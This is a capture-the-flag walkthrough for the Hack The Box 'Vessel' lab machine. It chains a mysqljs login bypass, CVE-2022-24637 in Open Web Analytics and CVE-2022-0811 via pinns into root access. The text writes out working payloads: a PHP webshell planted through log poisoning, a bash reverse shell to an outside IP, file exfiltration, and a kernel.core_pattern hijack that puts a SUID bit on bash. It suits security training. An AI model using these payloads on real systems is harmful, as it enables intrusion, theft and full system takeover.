# HTB Vessel — Full Walkthrough
**Difficulty:** Hard | **OS:** Linux | **IP:** 10.129.227.225

---

## The Hacker Mindset

Before we start — the goal of every HTB machine is to think like an attacker. Every service is an attack surface. Every piece of software has a version. Every version has a history of vulnerabilities. Every developer makes mistakes. Our job is to find those mistakes and chain them together from the outside all the way to root.

---

## Stage 1 — Reconnaissance

### Step 1: Port Scan with Nmap

```bash
nmap -p- --min-rate 10000 10.129.227.225
```

**Why:** Before you touch anything, you need to know what's listening. `-p-` scans all 65535 ports (not just the top 1000 that nmap defaults to). `--min-rate 10000` speeds it up so we're not waiting forever. This is the first thing every attacker does — map the attack surface.

**Result:** Ports 22 (SSH) and 80 (HTTP) are open.

### Step 2: Service Version Scan

```bash
nmap -p 22,80 -sCV 10.129.227.225
```

**Why:** Now that we know which ports are open, we do a deeper scan. `-sC` runs default scripts (banner grabbing, basic enumeration), `-sV` detects service versions. Versions matter enormously — an old Apache version might be vulnerable to a known CVE.

**Result:**
- Port 22: OpenSSH 8.2p1 (Ubuntu 20.04)
- Port 80: Apache 2.4.41

The OpenSSH version tells us this is likely Ubuntu 20.04 Focal. We note this for later (privilege escalation techniques vary by OS version).

### Step 3: Add Domain to /etc/hosts

```bash
echo "10.129.227.225 vessel.htb" | sudo tee -a /etc/hosts
```

**Why:** Web applications often use virtual hosting — the same IP serves different content based on the `Host:` HTTP header. By adding the domain, our browser/curl will send the right Host header and get the intended site. This also enables subdomain enumeration later.

---

## Stage 2 — Web Enumeration

### Step 4: Discover the Exposed Git Repository

```bash
curl -s http://vessel.htb/dev/.git/config
```

**Why:** Developers sometimes push code to production servers with the `.git` directory still present. This is a goldmine — it contains the entire version history, credentials, and source code. The `.git/config` file is the first thing to check because it reveals if the repo is there without needing a directory listing.

**Result:** The git config reveals developer name `Ethan` and email `ethan@vessel.htb`. Usernames are valuable — they can be SSH users, web app users, or give us clues about credentials.

### Step 5: Dump the Git Repository

```bash
git-dumper http://vessel.htb/dev ~/Downloads/htb/git
```

**Why:** `git-dumper` is a tool that reconstructs a git repository from a web server even when directory listing is disabled. It does this by fetching known git internal files (HEAD, index, pack files, objects) and piecing the repo back together. Once we have the source code, we can audit it for vulnerabilities far more efficiently than black-box testing.

### Step 6: Analyze the Source Code

```bash
cd ~/Downloads/htb/git && git log --oneline && cat routes/index.js
```

**Why:** Reading the git log tells us the history of changes. Commit messages like "Security Fixes" are a red flag — they mean there WAS a vulnerability, and we want to see both the old and new code. Reading `git diff` between commits shows exactly what was "fixed" and helps us understand the developer's intent.

**Key finding in routes/index.js:**
```javascript
connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?',
    [username, password], function(error, results, fields) {
```

The developer switched to parameterized queries (the `?` placeholders) to fix SQL injection. This looks secure at first glance. But — they're using the `mysqljs` library, which has a known type confusion vulnerability.

---

## Stage 3 — Authentication Bypass

### Step 7: Exploit mysqljs Type Confusion

```bash
curl -s -i -X POST http://vessel.htb/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password[password]=1" \
  -c /tmp/vessel_cookies.txt
```

**Why this works:** The `mysqljs` library is supposed to safely escape the `?` parameters. But when you pass an **object** instead of a string as a parameter, it behaves unexpectedly. The query becomes:

```sql
SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
```

In MySQL, this evaluates as:
```sql
SELECT * FROM accounts WHERE username = 'admin' AND (password = `password`) = 1
```

`password = password` is always true, so it becomes:
```sql
SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1
```

Which returns the admin row, granting access. The lesson: **parameterized queries are only safe if the library correctly handles all input types**. Object injection into query parameters is a subtle but real vulnerability.

**Hacker mindset:** When you see "Security Fixes" in git history, always check if the fix is complete. Developers often fix the obvious issue but miss edge cases.

**Result:** HTTP 302 redirect to `/admin` — we're logged in.

### Step 8: Discover the Analytics Subdomain

```bash
curl -s -b /tmp/vessel_cookies.txt http://vessel.htb/admin | grep -i "openwebanalytics"
```

**Why:** Now that we're authenticated, we explore every page and link. The admin dashboard has an "Analytics" link that points to `openwebanalytics.vessel.htb`. This is a new virtual host — a completely separate web application with its own attack surface.

```bash
echo "10.129.227.225 openwebanalytics.vessel.htb" | sudo tee -a /etc/hosts
```

---

## Stage 4 — CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)

### Step 9: Identify OWA Version

```bash
curl -s -L "http://openwebanalytics.vessel.htb/" | grep -i "version"
```

**Result:** OWA version **1.7.3**

**Why version matters:** OWA 1.7.3 was released in November 2021. The next version (1.7.4, February 2022) contained a "CRITICAL SECURITY FIX". This tells us 1.7.3 is vulnerable. Always check the version against known CVEs — this is CVE-2022-24637.

### Step 10: Understand CVE-2022-24637

This CVE has two parts:

**Part 1 — Information Disclosure:** OWA caches PHP objects to disk for performance. These cache files are stored in `owa-data/caches/` which is **publicly accessible without authentication**. The cache files are meant to be PHP files, but a bug in the caching code writes `<?php\n` with a literal `\n` instead of a real newline, breaking the PHP tag. The file is served as plain text instead of being executed — so its contents are readable.

The cache file for a user contains the **serialized user object**, including the `temp_passkey` field — a token used for password resets.

**Part 2 — Mass Assignment → Log Poisoning → RCE:** The OWA settings endpoint doesn't whitelist which configuration keys can be updated. By sending arbitrary `owa_config[key]` parameters, we can set hidden config options like `error_log_file` (change the log path to a `.php` file) and then write PHP code into that log file.

### Step 11: Trigger Password Reset to Generate Cache

```bash
curl -s -X POST "http://openwebanalytics.vessel.htb/index.php" \
  -d "owa_action=base.passwordResetRequest&owa_email_address=admin@vessel.htb&owa_submit=Request+New+Password"
```

**Why:** A failed login also generates a cache, but the `temp_passkey` from a failed login isn't written to the database — so it can't be used to change the password. The password reset action (`base.passwordResetRequest`) **generates a new temp_passkey AND writes it to the database**, making it valid for the password change endpoint.

**Why `admin@vessel.htb` exists:** We can confirm valid emails via the OWA "Forgot Password" form — it shows different responses for valid vs invalid emails. `admin@vessel.htb` returns success, confirming the account exists.

### Step 12: Fetch the Cache and Extract temp_passkey

The cache filename is predictable: `md5("user_id" + user_numeric_id)` where the admin's numeric ID is 1.

- Cache path: `/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php`
  (`fafe1b60c24107ccd8f4562213e44849` = md5("id1"))

```python
# exploit script
curl cache → base64 decode → deserialize → extract temp_passkey
```

**Why the filename is predictable:** We can trace through the OWA source code to find exactly how cache filenames are generated. The key is in `fileCache.php`: filename = `md5($col . $this->get('id'))`. For the password reset path, `$col` is "id" and `$this->get('id')` is 1.

### Step 13: Change Admin Password

```bash
curl -s -i -X POST "http://openwebanalytics.vessel.htb/index.php" \
  -d "owa_action=base.usersChangePassword&owa_k=<temp_passkey>&owa_password=hacked123&owa_password2=hacked123"
```

**Why this works:** The `base.usersChangePassword` action only checks that the supplied `owa_k` token matches a `temp_passkey` in the database. It doesn't verify email ownership, session state, or any other factor. If the token matches, the password is changed. This is the authentication flaw — we obtained the token from a publicly readable cache file.

**Result:** HTTP 302 with `status_code=3006` = success. Admin password is now `hacked123`.

### Step 14: Log in and Get RCE

```python
# 1. Login as admin
# 2. Get nonce from settings page
# 3. Set log file path to a .php file (mass assignment)
POST owa_config[base.error_log_level]=2
POST owa_config[base.error_log_file]=/var/www/html/owa/owa-data/logs/shell.php

# 4. Write PHP webshell into the log (mass assignment with fake config key)
POST owa_config[base.pwn]=<?php system($_REQUEST['cmd']); ?>
```

**Why mass assignment works:** OWA's `base.optionsUpdate` action loops over all `owa_config[*]` parameters and saves them to the configuration. There's no whitelist. So we can set internal config values that aren't exposed in the UI — including `error_log_file` (where OWA writes its debug log) and `error_log_level` (setting it to 2 makes OWA log all POST parameters).

**Why the log becomes executable PHP:** We changed the log file path to end in `.php`. Apache will execute any `.php` file as PHP. When OWA logs our POST parameters (including `<?php system($_REQUEST['cmd']); ?>`), that PHP code lands in a `.php` file in a web-accessible directory. Visiting that file executes it.

### Step 15: Reverse Shell

```bash
curl "http://openwebanalytics.vessel.htb/owa-data/logs/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1'"
```

**Why bash reverse shell:** We want an interactive shell, not just command output. A reverse shell has the target connect back to us (bypassing inbound firewall rules). `bash -i >& /dev/tcp/IP/PORT 0>&1` redirects stdin/stdout/stderr over a TCP connection.

**Result:** Shell as `www-data`.

---

## Stage 5 — Lateral Movement to Ethan

### Step 16: Enumerate the Filesystem

```bash
ls -la /home/steven/
ls -la /home/steven/.notes/
```

**Why:** After getting a shell, the first thing you do is enumerate home directories. Files left by developers often contain credentials, keys, or tools. We find:
- `passwordGenerator` — a Windows PE32 executable (34MB)
- `.notes/notes.pdf` — a password-protected PDF
- `.notes/screenshot.png` — a screenshot of the password generator UI

**Hacker mindset:** The screenshot shows a GUI app generating 32-character passwords with "All Characters" selected. The PDF is locked with a password. The password was probably generated by this app. If we can reverse the app and reproduce its output, we can crack the PDF.

### Step 17: Exfiltrate Files

```bash
# On target:
cp /home/steven/passwordGenerator /var/www/html/owa/owa-data/logs/pg
cp /home/steven/.notes/notes.pdf /var/www/html/owa/owa-data/logs/notes.pdf
cp /home/steven/.notes/screenshot.png /var/www/html/owa/owa-data/logs/ss.png

# On Kali:
wget http://openwebanalytics.vessel.htb/owa-data/logs/pg -O passwordGenerator
wget http://openwebanalytics.vessel.htb/owa-data/logs/notes.pdf
wget http://openwebanalytics.vessel.htb/owa-data/logs/ss.png
```

**Why this method:** We already have write access to the OWA web directory (we just wrote a webshell there). Copying files there and downloading via HTTP is reliable and fast, avoiding the need to set up netcat file transfers.

### Step 18: Analyze the Password Generator

The `passwordGenerator` is a **PyInstaller-bundled Windows executable**. PyInstaller packages a Python interpreter and scripts into a single `.exe`. We can reverse this:

1. Use `pyinstxtractor` to unpack the PyInstaller archive → extracts `.pyc` files
2. Use `uncompyle6` to decompile `.pyc` back to Python source

The key function:
```python
def genPassword(self):
    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
    qsrand(QTime.currentTime().msec())  # <-- seed is milliseconds!
    password = ''
    for i in range(32):
        idx = qrand() % len(charset)
        password += charset[idx]
    return password
```

**The vulnerability:** `QTime.currentTime().msec()` returns the current millisecond (0–999). There are only **1000 possible seeds**. This means there are only **1000 possible passwords** the app can generate, regardless of how "random" they look.

### Step 19: Generate the Password Wordlist

**Critical insight — platform difference:** The `passwordGenerator.exe` is a Windows binary. Qt's `qrand()` on Windows wraps the MSVC C runtime's `rand()`, which uses a simple LCG (Linear Congruential Generator):

```
state = (state * 214013 + 2531011) & 0xFFFFFFFF
return (state >> 16) & 0x7FFF   # RAND_MAX = 32767 on Windows
```

Linux's `glibc` uses a completely different (more complex) RNG. Using Linux's `rand()` via ctypes would generate **wrong passwords**. We must replicate the Windows MSVC algorithm exactly.

```python
import ctypes
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'

def msvc_srand(seed):
    global state
    state = seed & 0xFFFFFFFF

def msvc_rand():
    global state
    state = (state * 214013 + 2531011) & 0xFFFFFFFF
    return (state >> 16) & 0x7FFF

for seed in range(1000):
    msvc_srand(seed)
    pwd = ''.join(charset[msvc_rand() % len(charset)] for _ in range(32))
    passwords.add(pwd)
```

This generates 1000 unique passwords covering every possible output of the generator.

### Step 20: Crack the PDF

```bash
pdfcrack -f notes.pdf -w pass2.txt
```

**Why pdfcrack:** The PDF uses standard password encryption (not a modern algorithm). pdfcrack tries each password in our wordlist against the PDF's encryption parameters.

**Result:** `YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS`

### Step 21: Read the PDF

```bash
pdftotext -upw 'YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS' notes.pdf -
```

**Content:**
> Dear Steven, here is my password: `b@mPRNSVTjjLKId1T`
> — Ethan

**Hacker mindset:** People reuse passwords between systems. Ethan wrote his system password in a note to Steven. This is credential exposure through negligent documentation — a very common real-world finding.

### Step 22: SSH as Ethan + User Flag

```bash
ssh ethan@10.129.227.225  # password: b@mPRNSVTjjLKId1T
cat ~/user.txt
```

---

## Stage 6 — Privilege Escalation to Root (CVE-2022-0811)

### Step 23: Identify the Attack Vector

```bash
ls -la /usr/bin/pinns
find / -name runc 2>/dev/null
```

**Result:**
- `/usr/bin/pinns` — SUID binary owned by root, executable by group `ethan`
- `/usr/sbin/runc` — container runtime present

**What is pinns?** `pinns` is a utility from **CRI-O** (a container runtime for Kubernetes). Its job is to "pin" Linux namespaces — create new namespaces and bind them to files so they persist after all processes in them exit. It also accepts a `-s` flag to set **sysctl kernel parameters** within those namespaces.

**CVE-2022-0811:** Because `pinns` is SUID root, it runs as root. The `-s` parameter lets it set **any sysctl**, including `kernel.core_pattern`. On Linux, `kernel.core_pattern` defines what happens when a process crashes (core dump). If it starts with `|`, the kernel pipes the core dump to that program **as root**.

### Step 24: Understanding the Full Exploit Chain

The exploit requires two simultaneous actions:

1. **Set `kernel.core_pattern`** to execute our payload (via pinns SUID)
2. **Trigger a crash inside a runc container** which uses the compromised core_pattern

Why inside a container? Because `runc` containers run with elevated privileges (even rootless containers operate differently than regular processes), and triggering a segfault inside causes the kernel to invoke the core_pattern handler as root in the host's context.

### Step 25: Set Up the runc Container (Session 1)

```bash
mkdir /tmp/meow && cd /tmp/meow
runc spec --rootless    # generate default OCI container spec
mkdir rootfs            # empty root filesystem
```

Modify `config.json` to:
- Disable terminal (avoid `/dev/console` issues)
- Bind mount `/` from host into container (so we can access host filesystem)
- Bind mount `/dev` from host (so devices work)
- Clear device creation list

```bash
runc --root /tmp/meow run alpine
```

This drops us into a container shell running as root (container root, not host root).

### Step 26: Create the Payload (Session 2)

```bash
echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' > /home/ethan/e.sh
chmod +x /home/ethan/e.sh
```

**Why chmod +s on bash:** Setting the SUID bit on `/usr/bin/bash` means any user can run `bash -p` and get an effective UID of root. This is a permanent privilege escalation backdoor.

**Why `/home/ethan/` not `/tmp/`:** The server runs a cleanup cron job that deletes `*.sh` files from `/tmp`. Putting the script in ethan's home directory avoids this.

### Step 27: Hijack kernel.core_pattern (Session 2)

```bash
pinns -d /var/run \
      -f 844aa3c8-2c60-4245-a7df-9e26768ff303 \
      -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #' \
      --ipc --net --uts --cgroup
```

**Breaking down the parameters:**
- `-d /var/run` — directory to store namespace pin files
- `-f <uuid>` — filename for the namespace pin files (any valid UUID)
- `-s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #'` — sysctls to set. The `+` separates multiple sysctls. `kernel.core_pattern=|/home/ethan/e.sh #` sets the core dump handler to our script. The `#` at the end is a comment character that prevents any appended arguments from breaking the command.
- `--ipc --net --uts --cgroup` — namespace types to create/pin

**Why this runs as root:** `pinns` has the SUID bit set and is owned by root. When ethan runs it, the effective UID becomes root, and the sysctl write happens with root privileges. This is the exploit — a normal user can set `kernel.core_pattern` to an arbitrary path.

### Step 28: Trigger Core Dump (Session 1, inside container)

```bash
ulimit -c unlimited    # enable core dumps
tail -f /dev/null &    # background process to kill
kill -SIGSEGV %1       # send segfault signal → triggers core dump
```

**Why SIGSEGV:** A segmentation fault (SIGSEGV) is one of the signals that triggers a core dump. When the process crashes, the kernel executes `kernel.core_pattern` — which is now our payload script — **as root**.

The payload runs: `chmod +s /usr/bin/bash` — setting the SUID bit.

### Step 29: Root Shell

```bash
# Session 2:
ls -la /usr/bin/bash    # verify -rwsr-sr-x (SUID bit set)
bash -p                 # -p preserves effective UID (root)
cat /root/root.txt
```

**Why `bash -p`:** By default, bash drops privileges when it detects it's being run with an effective UID different from the real UID (a security feature). The `-p` flag disables this behavior, keeping the root effective UID.

---

## Summary of the Full Chain

```
Port 80 (HTTP)
    └── /dev/.git exposed
            └── Source code leaked
                    └── mysqljs type confusion → admin login on vessel.htb
                            └── openwebanalytics.vessel.htb discovered
                                    └── OWA 1.7.3 (CVE-2022-24637)
                                            ├── Cache disclosure → temp_passkey
                                            ├── Password reset → OWA admin access
                                            └── Mass assignment → log poisoning → RCE
                                                    └── www-data shell
                                                            └── passwordGenerator.exe (PyInstaller)
                                                                    └── MSVC rand() weakness → 1000 passwords
                                                                            └── pdfcrack → ethan's password
                                                                                    └── SSH as ethan → user.txt
                                                                                            └── pinns SUID (CVE-2022-0811)
                                                                                                    └── kernel.core_pattern hijack
                                                                                                            └── bash SUID → root.txt
```

## Key Lessons

| Lesson | Example in This Box |
|--------|---------------------|
| Never expose `.git` in production | Full source code leaked |
| Validate input types, not just values | mysqljs object injection |
| Authenticate all web directories | OWA cache files readable without auth |
| Don't store credentials in documents | Ethan's password in a PDF note |
| PRNGs seeded with time have tiny keyspace | 1000 possible passwords |
| SUID binaries are dangerous | pinns + kernel.core_pattern = root |
| Patch software promptly | OWA 1.7.3 → 1.7.4 critical security fix |
